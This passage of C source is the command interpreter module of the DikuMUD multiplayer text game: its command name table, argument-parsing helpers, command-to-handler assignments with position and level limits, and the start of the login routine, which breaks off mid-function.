/* ************************************************************************
*  file: Interpreter.c , Command interpreter module.      Part of DIKUMUD *
*  Usage: Procedures interpreting user command                            *
*  Copyright (C) 1990, 1991 - see 'license.doc' for complete information. *
************************************************************************* */
/* This won't work */

#include <string.h>
#include <ctype.h>
#include <stdio.h>
#include "structs.h"
#include "comm.h"
#include "interpreter.h"
#include "db.h"
#include "utils.h"
#include "limits.h"

#define COMMANDO(number,min_pos,pointer,min_level) {      \
	cmd_info[(number)].command_pointer = (pointer);         \
	cmd_info[(number)].minimum_position = (min_pos);        \
	cmd_info[(number)].minimum_level = (min_level); }

#define NOT !
#define AND &&
#define OR ||

#define STATE(d) ((d)->connected)
#define MAX_CMD_LIST 250

extern const struct title_type titles[4][25];
extern char motd[MAX_STRING_LENGTH];
extern struct char_data *character_list;
extern struct player_index_element *player_table;
extern int top_of_p_table;
extern struct index_data *mob_index;
extern struct index_data *obj_index;
extern struct room_data *world;
struct command_info cmd_info[MAX_CMD_LIST];


/* external fcntls */

void set_title(struct char_data *ch);
void init_char(struct char_data *ch);
void store_to_char(struct char_file_u *st, struct char_data *ch);
int create_entry(char *name);
int special(struct char_data *ch, int cmd, char *arg);
void log(char *str);

void do_move(struct char_data *ch, char *argument, int cmd);
void do_look(struct char_data *ch, char *argument, int cmd);
void do_read(struct char_data *ch, char *argument, int cmd);
void do_say(struct char_data *ch, char *argument, int cmd);
void do_exit(struct char_data *ch, char *argument, int cmd);
void do_snoop(struct char_data *ch, char *argument, int cmd);
void do_insult(struct char_data *ch, char *argument, int cmd);
void do_quit(struct char_data *ch, char *argument, int cmd);
void do_qui(struct char_data *ch, char *argument, int cmd);
void do_help(struct char_data *ch, char *argument, int cmd);
void do_who(struct char_data *ch, char *argument, int cmd);
void do_emote(struct char_data *ch, char *argument, int cmd);
void do_echo(struct char_data *ch, char *argument, int cmd);
void do_trans(struct char_data *ch, char *argument, int cmd);
void do_kill(struct char_data *ch, char *argument, int cmd);
void do_stand(struct char_data *ch, char *argument, int cmd);
void do_sit(struct char_data *ch, char *argument, int cmd);
void do_rest(struct char_data *ch, char *argument, int cmd);
void do_sleep(struct char_data *ch, char *argument, int cmd);
void do_wake(struct char_data *ch, char *argument, int cmd);
void do_force(struct char_data *ch, char *argument, int cmd);
void do_get(struct char_data *ch, char *argument, int cmd);
void do_drop(struct char_data *ch, char *argument, int cmd);
void do_news(struct char_data *ch, char *argument, int cmd);
void do_score(struct char_data *ch, char *argument, int cmd);
void do_inventory(struct char_data *ch, char *argument, int cmd);
void do_equipment(struct char_data *ch, char *argument, int cmd);
void do_shout(struct char_data *ch, char *argument, int cmd);
void do_not_here(struct char_data *ch, char *argument, int cmd);
void do_tell(struct char_data *ch, char *argument, int cmd);
void do_wear(struct char_data *ch, char *argument, int cmd);
void do_wield(struct char_data *ch, char *argument, int cmd);
void do_grab(struct char_data *ch, char *argument, int cmd);
void do_remove(struct char_data *ch, char *argument, int cmd);
void do_put(struct char_data *ch, char *argument, int cmd);
void do_shutdown(struct char_data *ch, char *argument, int cmd);
void do_save(struct char_data *ch, char *argument, int cmd);
void do_hit(struct char_data *ch, char *argument, int cmd);
void do_string(struct char_data *ch, char *arg, int cmd);
void do_give(struct char_data *ch, char *arg, int cmd);
void do_stat(struct char_data *ch, char *arg, int cmd);
void do_setskill(struct char_data *ch, char *arg, int cmd);
void do_time(struct char_data *ch, char *arg, int cmd);
void do_weather(struct char_data *ch, char *arg, int cmd);
void do_load(struct char_data *ch, char *arg, int cmd);
void do_purge(struct char_data *ch, char *arg, int cmd);
void do_shutdow(struct char_data *ch, char *arg, int cmd);
void do_idea(struct char_data *ch, char *arg, int cmd);
void do_typo(struct char_data *ch, char *arg, int cmd);
void do_bug(struct char_data *ch, char *arg, int cmd);
void do_whisper(struct char_data *ch, char *arg, int cmd);
void do_cast(struct char_data *ch, char *arg, int cmd);
void do_at(struct char_data *ch, char *arg, int cmd);
void do_goto(struct char_data *ch, char *arg, int cmd);
void do_ask(struct char_data *ch, char *arg, int cmd);
void do_drink(struct char_data *ch, char *arg, int cmd);
void do_eat(struct char_data *ch, char *arg, int cmd);
void do_pour(struct char_data *ch, char *arg, int cmd);
void do_sip(struct char_data *ch, char *arg, int cmd);
void do_taste(struct char_data *ch, char *arg, int cmd);
void do_order(struct char_data *ch, char *arg, int cmd);
void do_follow(struct char_data *ch, char *arg, int cmd);
void do_rent(struct char_data *ch, char *arg, int cmd);
void do_offer(struct char_data *ch, char *arg, int cmd);
void do_advance(struct char_data *ch, char *arg, int cmd);
void do_close(struct char_data *ch, char *arg, int cmd);
void do_open(struct char_data *ch, char *arg, int cmd);
void do_lock(struct char_data *ch, char *arg, int cmd);
void do_unlock(struct char_data *ch, char *arg, int cmd);
void do_exits(struct char_data *ch, char *arg, int cmd);
void do_enter(struct char_data *ch, char *arg, int cmd);
void do_leave(struct char_data *ch, char *arg, int cmd);
void do_write(struct char_data *ch, char *arg, int cmd);
void do_flee(struct char_data *ch, char *arg, int cmd);
void do_sneak(struct char_data *ch, char *arg, int cmd);
void do_hide(struct char_data *ch, char *arg, int cmd);
void do_backstab(struct char_data *ch, char *arg, int cmd);
void do_pick(struct char_data *ch, char *arg, int cmd);
void do_steal(struct char_data *ch, char *arg, int cmd);
void do_bash(struct char_data *ch, char *arg, int cmd);
void do_rescue(struct char_data *ch, char *arg, int cmd);
void do_kick(struct char_data *ch, char *arg, int cmd);
void do_examine(struct char_data *ch, char *arg, int cmd);
void do_info(struct char_data *ch, char *arg, int cmd);
void do_users(struct char_data *ch, char *arg, int cmd);
void do_where(struct char_data *ch, char *arg, int cmd);
void do_levels(struct char_data *ch, char *arg, int cmd);
void do_reroll(struct char_data *ch, char *arg, int cmd);
void do_brief(struct char_data *ch, char *arg, int cmd);
void do_wizlist(struct char_data *ch, char *arg, int cmd);
void do_consider(struct char_data *ch, char *arg, int cmd);
void do_group(struct char_data *ch, char *arg, int cmd);
void do_restore(struct char_data *ch, char *arg, int cmd);
void do_return(struct char_data *ch, char *argument, int cmd);
void do_switch(struct char_data *ch, char *argument, int cmd);
void do_quaff(struct char_data *ch, char *argument, int cmd);
void do_recite(struct char_data *ch, char *argument, int cmd);
void do_use(struct char_data *ch, char *argument, int cmd);
void do_pose(struct char_data *ch, char *argument, int cmd);
void do_noshout(struct char_data *ch, char *argument, int cmd);
void do_wizhelp(struct char_data *ch, char *argument, int cmd);
void do_credits(struct char_data *ch, char *argument, int cmd);

void do_action(struct char_data *ch, char *arg, int cmd);
void do_practice(struct char_data *ch, char *arg, int cmd);


char *command[]=
{ "north", 	     /* 1 */
  "east",
  "south",
  "west",
  "up",
  "down",
  "enter",
  "exits",
  "kiss",
  "get",
  "drink",	     /* 11 */
  "eat",
  "wear",
  "wield",
  "look",
  "score",
  "say",
  "shout",
  "tell",
  "inventory",
  "qui",	       /* 21 */
  "bounce",
  "smile",
  "dance",
  "kill",
  "cackle",
  "laugh",
  "giggle",
  "shake",
  "puke",
  "growl",  	   /* 31 */    
  "scream",
  "insult",
  "comfort",
  "nod",
  "sigh",
  "sulk",
  "help",
  "who",
  "emote",
  "echo",        /* 41 */
  "stand",
  "sit",
  "rest",
  "sleep",
  "wake",
  "force",
  "transfer",
  "hug",
  "snuggle",
  "cuddle",	     /* 51 */
  "nuzzle",
  "cry",
  "news",
  "equipment",
  "buy",
  "sell",
  "value",
  "list",
  "drop",
  "goto",	       /* 61 */
  "weather",
  "read",
  "pour",
  "grab",
  "remove",
  "put",
  "shutdow",
  "save",
  "hit",
  "string",      /* 71 */
  "give",
  "quit",
  "stat",
  "setskill",
  "time",
  "load",
  "purge",
  "shutdown",
  "idea",
  "typo",        /* 81 */
  "bug",
  "whisper",
  "cast",
  "at",
  "ask",
  "order",
  "sip",
  "taste",
  "snoop",
  "follow",      /* 91 */
  "rent",
  "offer",
  "poke",
  "advance",
  "accuse",
  "grin",
  "bow",
  "open",
  "close",
  "lock",        /* 101 */
  "unlock",
  "leave",
  "applaud",
  "blush",
  "burp",
  "chuckle",
  "clap",
  "cough",
  "curtsey",
  "fart",        /* 111 */
  "flip",
  "fondle",
  "frown",
  "gasp",
  "glare",
  "groan",
  "grope",
  "hiccup",
  "lick",
  "love",        /* 121 */
  "moan",
  "nibble",
  "pout",
  "purr",
  "ruffle",
  "shiver",
  "shrug",
  "sing",
  "slap",
  "smirk",       /* 131 */
  "snap",
  "sneeze",
  "snicker",
  "sniff",
  "snore",
  "spit",
  "squeeze",
  "stare",
  "strut",
  "thank",       /* 141 */
  "twiddle",
  "wave",
  "whistle",
  "wiggle",
  "wink",
  "yawn",
  "snowball",
  "write",
  "hold",
  "flee",        /* 151 */
  "sneak",
  "hide",
  "backstab",
  "pick",
  "steal",
  "bash",
  "rescue",
  "kick",
  "french",
  "comb",        /* 161 */
  "massage",
  "tickle",
  "practice",
  "pat",
  "examine",
  "take",
  "info",
  "'",
  "practise",
  "curse",       /* 171 */
  "use",
  "where",
  "levels",
  "reroll",
  "pray",
  ",",
  "beg",
  "bleed",
  "cringe",
  "daydream",    /* 181 */
  "fume",
  "grovel",
  "hop",
  "nudge",
  "peer",
  "point",
  "ponder",
  "punch",
  "snarl",
  "spank",       /* 191 */
  "steam",
  "tackle",
  "taunt",
  "think",
  "whine",
  "worship",
  "yodel",
  "brief",
  "wizlist",
  "consider",    /* 201 */
  "group",
  "restore",
  "return",
  "switch",      /* 205 */
	"quaff",
	"recite",
	"users",
	"pose",
	"noshout",
	"wizhelp",   /* 211 */
	"credits",
  "\n"
};


char *fill[]=
{ "in",
  "from",
  "with",
  "the",
  "on",
  "at",
  "to",
  "\n"
};

int search_block(char *arg, char **list, bool exact)
{
	register int i,l;

	/* Make into lower case, and get length of string */
	for(l=0; *(arg+l); l++)
		*(arg+l)=LOWER(*(arg+l));

	if (exact) {
		for(i=0; **(list+i) != '\n'; i++)
			if (!strcmp(arg, *(list+i)))
				return(i);
	} else {
		if (!l)
			l=1; /* Avoid "" to match the first available string */
		for(i=0; **(list+i) != '\n'; i++)
			if (!strncmp(arg, *(list+i), l))
				return(i);
	}

	return(-1);
}


int old_search_block(char *argument,int begin,int length,char **list,int mode)
{
	int guess, found, search;
        
	/* If the word contain 0 letters, then a match is already found */
	found = (length < 1);

	guess = 0;

	/* Search for a match */

	if(mode)
	while ( NOT found AND *(list[guess]) != '\n' )
	{
		found=(length==strlen(list[guess]));
		for(search=0;( search < length AND found );search++)
			found=(*(argument+begin+search)== *(list[guess]+search));
		guess++;
	} else {
		while ( NOT found AND *(list[guess]) != '\n' ) {
			found=1;
			for(search=0;( search < length AND found );search++)
				found=(*(argument+begin+search)== *(list[guess]+search));
			guess++;
		}
	}

	return ( found ? guess : -1 ); 
}

void command_interpreter(struct char_data *ch, char *argument) 
{
	int look_at, cmd, begin;
	extern int no_specials;

	REMOVE_BIT(ch->specials.affected_by, AFF_HIDE);

        /* Find first non blank */
 	for (begin = 0 ; (*(argument + begin ) == ' ' ) ; begin++ );
	
	/* Find length of first word */
	for (look_at = 0; *(argument + begin + look_at ) > ' ' ; look_at++)

      		/* Make all letters lower case AND find length */
		*(argument + begin + look_at) = 
		LOWER(*(argument + begin + look_at));

	
	cmd = old_search_block(argument,begin,look_at,command,0);
 
	
	if (!cmd)
		return;

	if ( cmd>0 && GET_LEVEL(ch)<cmd_info[cmd].minimum_level )
	{
		send_to_char("Arglebargle, glop-glyf!?!\n\r", ch);
		return;
	}

	if ( cmd>0 && (cmd_info[cmd].command_pointer != 0))
	{
		if( GET_POS(ch) < cmd_info[cmd].minimum_position )
			switch(GET_POS(ch))
			{
				case POSITION_DEAD:
					send_to_char("Lie still; you are DEAD!!! :-( \n\r", ch);
				break;
				case POSITION_INCAP:
				case POSITION_MORTALLYW:
					send_to_char(
						"You are in a pretty bad shape, unable to do anything!\n\r",
						ch);
				break;

				case POSITION_STUNNED:
					send_to_char(
					"All you can do right now, is think about the stars!\n\r", ch);
				break;
				case POSITION_SLEEPING:
					send_to_char("In your dreams, or what?\n\r", ch);
				break;
				case POSITION_RESTING:
					send_to_char("Nah... You feel too relaxed to do that..\n\r",
						ch);
				break;
				case POSITION_SITTING:
					send_to_char("Maybe you should get on your feet first?\n\r",ch);
				break;
				case POSITION_FIGHTING:
					send_to_char("No way! You are fighting for your life!\n\r", ch);
				break;
			}
		else
		{
			if (!no_specials && special(ch, cmd, argument + begin + look_at))
				return;  

			((*cmd_info[cmd].command_pointer)
			(ch, argument + begin + look_at, cmd));
		}
		return;
	}
	if ( cmd>0 && (cmd_info[cmd].command_pointer == 0))
		send_to_char(
		"Sorry, but that command has yet to be implemented...\n\r",
			ch);
	else 
	   send_to_char("Arglebargle, glop-glyf!?!\n\r", ch);
}

void argument_interpreter(char *argument,char *first_arg,char *second_arg )
{
        int look_at, found, begin;

        found = begin = 0;

        do
        {
                /* Find first non blank */
                for ( ;*(argument + begin ) == ' ' ; begin++);

                /* Find length of first word */
                for ( look_at=0; *(argument+begin+look_at)> ' ' ; look_at++)

                        /* Make all letters lower case,
                           AND copy them to first_arg */
                        *(first_arg + look_at) =
                        LOWER(*(argument + begin + look_at));

                *(first_arg + look_at)='\0';
                begin += look_at;

        }
        while( fill_word(first_arg));

        do
        {
                /* Find first non blank */
                for ( ;*(argument + begin ) == ' ' ; begin++);

                /* Find length of first word */
                for ( look_at=0; *(argument+begin+look_at)> ' ' ; look_at++)

                        /* Make all letters lower case,
                           AND copy them to second_arg */
                        *(second_arg + look_at) =
                        LOWER(*(argument + begin + look_at));

                *(second_arg + look_at)='\0';
                begin += look_at;

        }
        while( fill_word(second_arg));
}

int is_number(char *str)
{
	int look_at;

	if(*str=='\0')
		return(0);

	for(look_at=0;*(str+look_at) != '\0';look_at++)
		if((*(str+look_at)<'0')||(*(str+look_at)>'9'))
			return(0);
	return(1);
}

/*  Quinn substituted a new one-arg for the old one.. I thought returning a 
    char pointer would be neat, and avoiding the func-calls would save a
    little time... If anyone feels pissed, I'm sorry.. Anyhow, the code is
    snatched from the old one, so it outta work..

void one_argument(char *argument,char *first_arg )
{
	static char dummy[MAX_STRING_LENGTH];

	argument_interpreter(argument,first_arg,dummy);
}

*/


/* find the first sub-argument of a string, return pointer to first char in
   primary argument, following the sub-arg			            */
char *one_argument(char *argument, char *first_arg )
{
	int found, begin, look_at;

        found = begin = 0;

        do
        {
                /* Find first non blank */
                for ( ;isspace(*(argument + begin)); begin++);

                /* Find length of first word */
                for (look_at=0; *(argument+begin+look_at) > ' ' ; look_at++)

                        /* Make all letters lower case,
                           AND copy them to first_arg */
                        *(first_arg + look_at) =
                        LOWER(*(argument + begin + look_at));

                *(first_arg + look_at)='\0';
		begin += look_at;
	}
        while (fill_word(first_arg));

	return(argument+begin);
}
	
	






int fill_word(char *argument)
{
	return ( search_block(argument,fill,TRUE) >= 0);
}





/* determine if a given string is an abbreviation of another */
int is_abbrev(char *arg1, char *arg2)
{
	if (!*arg1)
	   return(0);

	for (; *arg1; arg1++, arg2++)
	   if (LOWER(*arg1) != LOWER(*arg2))
	      return(0);

	return(1);
}




/* return first 'word' plus trailing substring of input string */
void half_chop(char *string, char *arg1, char *arg2)
{
	for (; isspace(*string); string++);

	for (; !isspace(*arg1 = *string) && *string; string++, arg1++);

	*arg1 = '\0';

	for (; isspace(*string); string++);

	for (; *arg2 = *string; string++, arg2++);
}



int special(struct char_data *ch, int cmd, char *arg)
{
	register struct obj_data *i;
	register struct char_data *k;
	int j;

	/* special in room? */
	if (world[ch->in_room].funct)
	   if ((*world[ch->in_room].funct)(ch, cmd, arg))
	      return(1);

	/* special in equipment list? */
	for (j = 0; j <= (MAX_WEAR - 1); j++)
	   if (ch->equipment[j] && ch->equipment[j]->item_number>=0)
	      if (obj_index[ch->equipment[j]->item_number].func)
	         if ((*obj_index[ch->equipment[j]->item_number].func)
	            (ch, cmd, arg))
	            return(1);

	/* special in inventory? */
	for (i = ch->carrying; i; i = i->next_content)
		if (i->item_number>=0)
			if (obj_index[i->item_number].func)
	   	   if ((*obj_index[i->item_number].func)(ch, cmd, arg))
	       	  return(1);

	/* special in mobile present? */
	for (k = world[ch->in_room].people; k; k = k->next_in_room)
	   if ( IS_MOB(k) )
	      if (mob_index[k->nr].func)
	         if ((*mob_index[k->nr].func)(ch, cmd, arg))
	            return(1);

	/* special in object present? */
	for (i = world[ch->in_room].contents; i; i = i->next_content)
	   if (i->item_number>=0)
	      if (obj_index[i->item_number].func)
	         if ((*obj_index[i->item_number].func)(ch, cmd, arg))
	            return(1);


	return(0);
}

void assign_command_pointers ( void )
{
	int position;

	for (position = 0 ; position < MAX_CMD_LIST; position++)
		cmd_info[position].command_pointer = 0;

	COMMANDO(1,POSITION_STANDING,do_move,0);
	COMMANDO(2,POSITION_STANDING,do_move,0);
	COMMANDO(3,POSITION_STANDING,do_move,0);
	COMMANDO(4,POSITION_STANDING,do_move,0);
	COMMANDO(5,POSITION_STANDING,do_move,0);
	COMMANDO(6,POSITION_STANDING,do_move,0);
	COMMANDO(7,POSITION_STANDING,do_enter,0);
	COMMANDO(8,POSITION_RESTING,do_exits,0);
	COMMANDO(9,POSITION_RESTING,do_action,0);
	COMMANDO(10,POSITION_RESTING,do_get,0);
	COMMANDO(11,POSITION_RESTING,do_drink,0);
	COMMANDO(12,POSITION_RESTING,do_eat,0);
	COMMANDO(13,POSITION_RESTING,do_wear,0);
	COMMANDO(14,POSITION_RESTING,do_wield,0);
	COMMANDO(15,POSITION_RESTING,do_look,0);
	COMMANDO(16,POSITION_DEAD,do_score,0);
	COMMANDO(17,POSITION_RESTING,do_say,0);
	COMMANDO(18,POSITION_RESTING,do_shout,0);
	COMMANDO(19,POSITION_DEAD,do_tell,0);
	COMMANDO(20,POSITION_DEAD,do_inventory,0);
	COMMANDO(21,POSITION_DEAD,do_qui,0);
	COMMANDO(22,POSITION_STANDING,do_action,0);
	COMMANDO(23,POSITION_RESTING,do_action,0);
	COMMANDO(24,POSITION_STANDING,do_action,0);
	COMMANDO(25,POSITION_FIGHTING,do_kill,0);
	COMMANDO(26,POSITION_RESTING,do_action,0);
	COMMANDO(27,POSITION_RESTING,do_action,0);
	COMMANDO(28,POSITION_RESTING,do_action,0);
	COMMANDO(29,POSITION_RESTING,do_action,0);
	COMMANDO(30,POSITION_RESTING,do_action,0);
	COMMANDO(31,POSITION_RESTING,do_action,0);
	COMMANDO(32,POSITION_RESTING,do_action,0);
	COMMANDO(33,POSITION_RESTING,do_insult,0);
	COMMANDO(34,POSITION_RESTING,do_action,0);
	COMMANDO(35,POSITION_RESTING,do_action,0);
	COMMANDO(36,POSITION_RESTING,do_action,0);
	COMMANDO(37,POSITION_RESTING,do_action,0);
	COMMANDO(38,POSITION_DEAD,do_help,0);
	COMMANDO(39,POSITION_DEAD,do_who,0);
	COMMANDO(40,POSITION_SLEEPING,do_emote,1);
	COMMANDO(41,POSITION_SLEEPING,do_echo,21);	
	COMMANDO(42,POSITION_RESTING,do_stand,0);
	COMMANDO(43,POSITION_RESTING,do_sit,0);
	COMMANDO(44,POSITION_RESTING,do_rest,0);
	COMMANDO(45,POSITION_SLEEPING,do_sleep,0);
	COMMANDO(46,POSITION_SLEEPING,do_wake,0);
	COMMANDO(47,POSITION_SLEEPING,do_force,22);
	COMMANDO(48,POSITION_SLEEPING,do_trans,22);
	COMMANDO(49,POSITION_RESTING,do_action,0);
	COMMANDO(50,POSITION_RESTING,do_action,0);
	COMMANDO(51,POSITION_RESTING,do_action,0);
	COMMANDO(52,POSITION_RESTING,do_action,0);
	COMMANDO(53,POSITION_RESTING,do_action,0);
	COMMANDO(54,POSITION_SLEEPING,do_news,0);
	COMMANDO(55,POSITION_SLEEPING,do_equipment,0);
	COMMANDO(56,POSITION_STANDING,do_not_here,0);
	COMMANDO(57,POSITION_STANDING,do_not_here,0);
	COMMANDO(58,POSITION_STANDING,do_not_here,0);
	COMMANDO(59,POSITION_STANDING,do_not_here,0);
	COMMANDO(60,POSITION_RESTING,do_drop,0);
	COMMANDO(61,POSITION_SLEEPING,do_goto,21);
	COMMANDO(62,POSITION_RESTING,do_weather,0);
	COMMANDO(63,POSITION_RESTING,do_read,0);
	COMMANDO(64,POSITION_STANDING,do_pour,0);
	COMMANDO(65,POSITION_RESTING,do_grab,0);
	COMMANDO(66,POSITION_RESTING,do_remove,0);
	COMMANDO(67,POSITION_RESTING,do_put,0);
	COMMANDO(68,POSITION_DEAD,do_shutdow,24);
	COMMANDO(69,POSITION_SLEEPING,do_save,0);
	COMMANDO(70,POSITION_FIGHTING,do_hit,0);
	COMMANDO(71,POSITION_SLEEPING,do_string,23);
	COMMANDO(72,POSITION_RESTING,do_give,0);
	COMMANDO(73,POSITION_DEAD,do_quit,0);
	COMMANDO(74,POSITION_DEAD,do_stat,21);
	COMMANDO(75,POSITION_SLEEPING,do_setskill,22);
	COMMANDO(76,POSITION_DEAD,do_time,0);
	COMMANDO(77,POSITION_DEAD,do_load,22);
	COMMANDO(78,POSITION_DEAD,do_purge,22);
	COMMANDO(79,POSITION_DEAD,do_shutdown,24);
	COMMANDO(80,POSITION_DEAD,do_idea,0);
	COMMANDO(81,POSITION_DEAD,do_typo,0);
	COMMANDO(82,POSITION_DEAD,do_bug,0);
	COMMANDO(83,POSITION_RESTING,do_whisper,0);
	COMMANDO(84,POSITION_SITTING,do_cast,1);
	COMMANDO(85,POSITION_DEAD,do_at,22);
	COMMANDO(86,POSITION_RESTING,do_ask,0);
	COMMANDO(87,POSITION_RESTING,do_order,1);
	COMMANDO(88,POSITION_RESTING,do_sip,0);
	COMMANDO(89,POSITION_RESTING,do_taste,0);
	COMMANDO(90,POSITION_DEAD,do_snoop,23);
	COMMANDO(91,POSITION_RESTING,do_follow,0);
	COMMANDO(92,POSITION_STANDING,do_not_here,1);
	COMMANDO(93,POSITION_STANDING,do_not_here,1);
	COMMANDO(94,POSITION_RESTING,do_action,0);
	COMMANDO(95,POSITION_DEAD,do_advance,23);
	COMMANDO(96,POSITION_SITTING,do_action,0);
	COMMANDO(97,POSITION_RESTING,do_action,0);
	COMMANDO(98,POSITION_STANDING,do_action,0);
	COMMANDO(99,POSITION_SITTING,do_open,0);
	COMMANDO(100,POSITION_SITTING,do_close,0);
	COMMANDO(101,POSITION_SITTING,do_lock,0);
	COMMANDO(102,POSITION_SITTING,do_unlock,0);
	COMMANDO(103,POSITION_STANDING,do_leave,0);
	COMMANDO(104,POSITION_RESTING,do_action,0);
	COMMANDO(105,POSITION_RESTING,do_action,0);
	COMMANDO(106,POSITION_RESTING,do_action,0);
	COMMANDO(107,POSITION_RESTING,do_action,0);
	COMMANDO(108,POSITION_RESTING,do_action,0);
	COMMANDO(109,POSITION_RESTING,do_action,0);
	COMMANDO(110,POSITION_STANDING,do_action,0);
	COMMANDO(111,POSITION_RESTING,do_action,0);
	COMMANDO(112,POSITION_STANDING,do_action,0);
	COMMANDO(113,POSITION_RESTING,do_action,0);
	COMMANDO(114,POSITION_RESTING,do_action,0);
	COMMANDO(115,POSITION_RESTING,do_action,0);
	COMMANDO(116,POSITION_RESTING,do_action,0);
	COMMANDO(117,POSITION_RESTING,do_action,0);
	COMMANDO(118,POSITION_RESTING,do_action,0);
	COMMANDO(119,POSITION_RESTING,do_action,0);
	COMMANDO(120,POSITION_RESTING,do_action,0);
	COMMANDO(121,POSITION_RESTING,do_action,0);
	COMMANDO(122,POSITION_RESTING,do_action,0);
	COMMANDO(123,POSITION_RESTING,do_action,0);
	COMMANDO(124,POSITION_RESTING,do_action,0);
	COMMANDO(125,POSITION_RESTING,do_action,0);
	COMMANDO(126,POSITION_STANDING,do_action,0);
	COMMANDO(127,POSITION_RESTING,do_action,0);
	COMMANDO(128,POSITION_RESTING,do_action,0);
	COMMANDO(129,POSITION_RESTING,do_action,0);
	COMMANDO(130,POSITION_RESTING,do_action,0);
	COMMANDO(131,POSITION_RESTING,do_action,0);
	COMMANDO(132,POSITION_RESTING,do_action,0);
	COMMANDO(133,POSITION_RESTING,do_action,0);
	COMMANDO(134,POSITION_RESTING,do_action,0);
	COMMANDO(135,POSITION_RESTING,do_action,0);
	COMMANDO(136,POSITION_SLEEPING,do_action,0);
	COMMANDO(137,POSITION_STANDING,do_action,0);
	COMMANDO(138,POSITION_RESTING,do_action,0);
	COMMANDO(139,POSITION_RESTING,do_action,0);
	COMMANDO(140,POSITION_STANDING,do_action,0);
	COMMANDO(141,POSITION_RESTING,do_action,0);
	COMMANDO(142,POSITION_RESTING,do_action,0);
	COMMANDO(143,POSITION_RESTING,do_action,0);
	COMMANDO(144,POSITION_RESTING,do_action,0);
	COMMANDO(145,POSITION_STANDING,do_action,0);
	COMMANDO(146,POSITION_RESTING,do_action,0);
	COMMANDO(147,POSITION_RESTING,do_action,0);
	COMMANDO(148,POSITION_STANDING,do_action,22);
	COMMANDO(149,POSITION_STANDING,do_write,1);
	COMMANDO(150,POSITION_RESTING,do_grab,1);
	COMMANDO(151,POSITION_FIGHTING,do_flee,1);	
	COMMANDO(152,POSITION_STANDING,do_sneak,1);	
	COMMANDO(153,POSITION_RESTING,do_hide,1);	
	COMMANDO(154,POSITION_STANDING,do_backstab,1);	
	COMMANDO(155,POSITION_STANDING,do_pick,1);	
	COMMANDO(156,POSITION_STANDING,do_steal,1);	
	COMMANDO(157,POSITION_FIGHTING,do_bash,1);	
	COMMANDO(158,POSITION_FIGHTING,do_rescue,1);
	COMMANDO(159,POSITION_FIGHTING,do_kick,1);
	COMMANDO(160,POSITION_RESTING,do_action,0);
	COMMANDO(161,POSITION_RESTING,do_action,0);
	COMMANDO(162,POSITION_RESTING,do_action,0);
	COMMANDO(163,POSITION_RESTING,do_action,0);
	COMMANDO(164,POSITION_RESTING,do_practice,1);
	COMMANDO(165,POSITION_RESTING,do_action,0);
	COMMANDO(166,POSITION_SITTING,do_examine,0);
	COMMANDO(167,POSITION_RESTING,do_get,0); /* TAKE */
	COMMANDO(168,POSITION_SLEEPING,do_info,0);
	COMMANDO(169,POSITION_RESTING,do_say,0);
	COMMANDO(170,POSITION_RESTING,do_practice,1);
	COMMANDO(171,POSITION_RESTING,do_action,0);
	COMMANDO(172,POSITION_SITTING,do_use,1);
	COMMANDO(173,POSITION_DEAD,do_where,1);
	COMMANDO(174,POSITION_DEAD,do_levels,0);
	COMMANDO(175,POSITION_DEAD,do_reroll,24);
	COMMANDO(176,POSITION_SITTING,do_action,0);
	COMMANDO(177,POSITION_SLEEPING,do_emote,1);
	COMMANDO(178,POSITION_RESTING,do_action,0);
	COMMANDO(179,POSITION_RESTING,do_action,0);
	COMMANDO(180,POSITION_RESTING,do_action,0);
	COMMANDO(181,POSITION_SLEEPING,do_action,0);
	COMMANDO(182,POSITION_RESTING,do_action,0);
	COMMANDO(183,POSITION_RESTING,do_action,0);
	COMMANDO(184,POSITION_RESTING,do_action,0);
	COMMANDO(185,POSITION_RESTING,do_action,0);
	COMMANDO(186,POSITION_RESTING,do_action,0);
	COMMANDO(187,POSITION_RESTING,do_action,0);
	COMMANDO(188,POSITION_RESTING,do_action,0);
	COMMANDO(189,POSITION_RESTING,do_action,0);
	COMMANDO(190,POSITION_RESTING,do_action,0);
	COMMANDO(191,POSITION_RESTING,do_action,0);
	COMMANDO(192,POSITION_RESTING,do_action,0);
	COMMANDO(193,POSITION_RESTING,do_action,0);
	COMMANDO(194,POSITION_RESTING,do_action,0);
	COMMANDO(195,POSITION_RESTING,do_action,0);
	COMMANDO(196,POSITION_RESTING,do_action,0);
	COMMANDO(197,POSITION_RESTING,do_action,0);
	COMMANDO(198,POSITION_RESTING,do_action,0);
	COMMANDO(199,POSITION_DEAD,do_brief,0);
	COMMANDO(200,POSITION_DEAD,do_wizlist,0);
	COMMANDO(201,POSITION_RESTING,do_consider,0);
	COMMANDO(202,POSITION_RESTING,do_group,1);
	COMMANDO(203,POSITION_DEAD,do_restore,22);
	COMMANDO(204,POSITION_DEAD,do_return,0);
	COMMANDO(205,POSITION_DEAD,do_switch,23);
	COMMANDO(206,POSITION_RESTING,do_quaff,0);
	COMMANDO(207,POSITION_RESTING,do_recite,0);
	COMMANDO(208,POSITION_DEAD,do_users,21);
	COMMANDO(209,POSITION_STANDING,do_pose,0);
	COMMANDO(210,POSITION_SLEEPING,do_noshout,22);
	COMMANDO(211,POSITION_SLEEPING,do_wizhelp,21);
	COMMANDO(212,POSITION_DEAD,do_credits,0);
}

/* *************************************************************************
*  Stuff for controlling the non-playing sockets (get name, pwd etc)       *
************************************************************************* */




/* locate entry in p_table with entry->name == name. -1 mrks failed search */
int find_name(char *name)
{
	int i;

	for (i = 0; i <= top_of_p_table; i++)
	{
	   if (!str_cmp((player_table + i)->name, name))
	      return(i);
	}

	return(-1);
}


int _parse_name(char *arg, char *name)
{
	int i;

	/* skip whitespaces */
	for (; isspace(*arg); arg++);
	
	for (i = 0; *name = *arg; arg++, i++, name++) 
	   if ((*arg <0) || !isalpha(*arg) || i > 15)
	      return(1); 

	if (!i)
	   return(1);

	return(0);
}
			




/* deal with newcomers and other non-playing sockets */
void nanny(struct descriptor_data *d, char *arg)
{
	char buf[100];
	int player_i;
	char tmp_name[20];
	struct char_file_u tmp_store;
	struct char_data *ch, *tmp_ch;
	struct descriptor_data *k;
	extern struct descriptor_data *descriptor_list;

	void do_look(struct char_data *ch, char *argument, int cmd);
	void load_char_objs(struct char_data *ch);
	int load_char(char *name, struct char_file_u *char_element);


	switch (STATE(d))
	{
		case CON_NME:		/* wait for input of name	*/
			if (!d->character)
			{
				CREATE(d->character, struct char_data, 1);
				clear_char(d->character);
				d->character->desc = d;
			}

			for (; isspace(*arg); arg++)  ;
			if (!*arg)
			   close_socket(d);
			else {

				if(_parse_name(arg, tmp_name))
				{
					SEND_TO_Q("Illegal name, please try another.", d);
					SEND_TO_Q("Name: ", d);
